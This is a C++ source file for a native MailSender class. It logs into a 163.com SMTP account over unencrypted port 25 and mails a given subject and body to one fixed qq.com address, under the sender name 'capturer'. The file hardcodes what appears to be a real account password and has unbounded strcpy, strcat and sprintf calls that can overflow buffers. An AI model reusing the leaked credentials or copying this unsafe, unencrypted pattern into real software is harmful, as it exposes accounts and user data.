
#include <log.h>
#include "mail/mail.h"

static const char base64_table[64] = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G',
        'H', 'I', 'J', 'K', 'L', 'M', 'N',
        'O', 'P', 'Q', 'R', 'S', 'T',
        'U', 'V', 'W', 'X', 'Y', 'Z',
        'a', 'b', 'c', 'd', 'e', 'f', 'g',
        'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't',
        'u', 'v', 'w', 'x', 'y', 'z',
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        '+', '/'
};

/**
 * SMTP服务器返回的一些错误码,用来判断邮件发送是否成功
 */
static const char* SVR_ERROR[] = {
        "501",  //参数格式错误
        "502",  //命令不可实现
        "503",  //错误的命令序列
        "504",  //命令参数不可实现
        "421",  //服务器未就绪,关闭传输信道
        "450",  //要求的邮件操作未完成,邮箱不可用
        "550",  //要求的邮件操作未完成,邮箱不可用
        "451",  //处理过程中出错,放弃要求的操作
        "452",  //系统存储不足,要求的操作未执行
        "554",  //操作失败
        "551",  //用户非本地
        "552",  //过量的存储分配,要求的操作未执行
        "553",  //邮箱名不可用,要求的操作未执行
        "-1"    //其他错误
};

static const char *QQ_SMTP_SVR = "smtp.163.com";

static const char BODY[] = "From: \"capturer\"<m18688820297_1@163.com>\r\nTo: \"312115287\"<312115287@qq.com>\r\n";

static char G_BODY[4096] = {0};

int MailSender::base64_encode(unsigned char* pBase64, int nLen, char* pOutBuf, int nBufSize) {
    int i = 0;
    int j = 0;
    int nOutStrLen = 0;

    /* nOutStrLen does not contain null terminator. */
    nOutStrLen = nLen / 3 * 4 + (0 == (nLen % 3) ? 0 : 4);
    if ( pOutBuf && nOutStrLen < nBufSize ) {
        char cTmp = 0;
        for ( i = 0, j = 0; i < nLen; i += 3, j += 4 ) {
            /* the first character: from the first byte. */
            pOutBuf[j] = base64_table[pBase64[i] >> 2];

            /* the second character: from the first & second byte. */
            cTmp = (char)((pBase64[i] & 0x3) << 4);
            if ( i + 1 < nLen )
            {
                cTmp |= ((pBase64[i + 1] & 0xf0) >> 4);
            }
            pOutBuf[j+1] = base64_table[(int)cTmp];

            /* the third character: from the second & third byte. */
            cTmp = '=';
            if ( i + 1 < nLen ) {
                cTmp = (char)((pBase64[i + 1] & 0xf) << 2);
                if ( i + 2 < nLen )
                {
                    cTmp |= (pBase64[i + 2] >> 6);
                }
                cTmp = base64_table[(int)cTmp];
            }
            pOutBuf[j + 2] = cTmp;

            /* the fourth character: from the third byte. */
            cTmp = '=';
            if ( i + 2 < nLen ) {
                cTmp = base64_table[pBase64[i + 2] & 0x3f];
            }
            pOutBuf[j + 3] = cTmp;
        }

        pOutBuf[j] = '\0';
    }

    return nOutStrLen + 1;
}

bool MailSender::init_addr() {
    struct hostent *host = NULL;

    if((host = gethostbyname(QQ_SMTP_SVR))==NULL) {
        LOGE("MAIL:Gethostname error, %s\n", strerror(errno));
        return false;
    }

    m_addr_in.sin_family = AF_INET;
    m_addr_in.sin_port = htons(25);
    m_addr_in.sin_addr = *((struct in_addr *)host->h_addr);
    return true;
}

bool MailSender::connect_smtp_server() {
    m_conn_fd = socket(PF_INET, SOCK_STREAM, 0);

    if(m_conn_fd < 0) {
        LOGE("MAIL:Open sockfd(TCP) error!\n");
        return false;
    }

    if(connect(m_conn_fd, (struct sockaddr*)&m_addr_in, sizeof(struct sockaddr)) < 0) {
        close(m_conn_fd);
        LOGE("MAIL:Connect sockfd(TCP ) error!\n");
        return false;
    }

    return true;
}

const char *MailSender::make_body(const char *subject, const char *content) {
    int len = 0;
    strcpy(G_BODY, BODY);
    len += strlen(BODY);
    char tmp[1024] = {0};
    sprintf(tmp, "Subject: %s\r\n\r\n", subject);
    strcat(G_BODY, tmp);
    len += strlen(tmp);
    strcat(G_BODY, content);
    len += strlen(content);
    G_BODY[len] = 0;
    return G_BODY;
}

int MailSender::send_mail(const char *subject, const char *content) {
    if ( !init_addr()) {
        return -1;
    }
    if ( !connect_smtp_server() ) {
        return -1;
    }
    char rbuf[1500] = {0};

    //如果没有收到服务器响应,重连
    int nr = 0;
    while((nr = recv(m_conn_fd, rbuf, 1500, 0)) == 0) {
        LOGE("MAIL:reconnect..\n");
        close(m_conn_fd);
        sleep(2);
        connect_smtp_server();
        memset(rbuf, 0, 1500);
    }

    //服务器有响应,开始SMTP交互
    rbuf[nr] = 0;
    nr = 0;
    LOGE("MAIL:rsp from server:%s", rbuf);

    char sbuf[1500] = {0};
    int ret = 0;

    //发送 EHLO,并等待应答
    sprintf(sbuf, "EHLO ANDROID-PHONE\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:EHLO RSP:%s", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //请求认证并等待应答
    memset(sbuf, 0, 1500);
    sprintf(sbuf, "AUTH LOGIN\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:AUTH LOGIN RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    memset(sbuf, 0, 1500);
    sprintf(sbuf, "m18688820297_1");
    char login[128];
    memset(login, 0, 128);
    base64_encode((unsigned char*)sbuf, strlen(sbuf), login, 128);
    sprintf(sbuf, "%s\r\n", login);
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:USER RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    memset(sbuf, 0, 1500);
    sprintf(sbuf, "ja3035JAI");
    char pass[128];
    memset(pass, 0, 128);
    base64_encode((unsigned char*)sbuf, strlen(sbuf), pass, 128);
    memset(sbuf, 0, 1500);
    sprintf(sbuf, "%s\r\n", pass);
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:USER PASS RSP:%s", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //MAIL FROM
    memset(sbuf, 0, 1500);
    sprintf(sbuf, "MAIL FROM: <m18688820297_1@163.com>\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:MAIL FROM RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //收件人
    sprintf(sbuf, "RCPT TO:<312115287@qq.com>\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:RCPT RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //DATA
    sprintf(sbuf, "DATA\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:DATA RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //send email
    sprintf(sbuf, "%s\r\n.\r\n", make_body(subject, content));
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL:SEND EMAIL RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    //QUIT
    sprintf(sbuf, "QUIT\r\n");
    send(m_conn_fd, sbuf, strlen(sbuf), 0);
    memset(rbuf, 0, 1500);
    recv(m_conn_fd, rbuf, 1500, 0);
    LOGE("MAIL QUIT RSP:%s\n", rbuf);
    if ((ret = check_success(rbuf)) != 0) return ret;

    return 0;
}

int MailSender::check_success(const char *rsp) {
    if (NULL == rsp || strlen(rsp) == 0) return -1;
    int len = sizeof(SVR_ERROR) / sizeof(SVR_ERROR[0]);
    for (int i = 0; i < len; i++) {
        char *ptr = strstr(rsp, SVR_ERROR[i]);
        if (ptr != NULL) {
            int ret;
            sscanf(SVR_ERROR[i], "%d", &ret);
            return ret;
        }
    }
    return 0;
}

MailSender::MailSender() : m_conn_fd(-1) {
    memset(&m_addr_in, 0, sizeof(m_addr_in));
}

MailSender::~MailSender() {
    if (m_conn_fd >= 0) {
        close(m_conn_fd);
    }
}
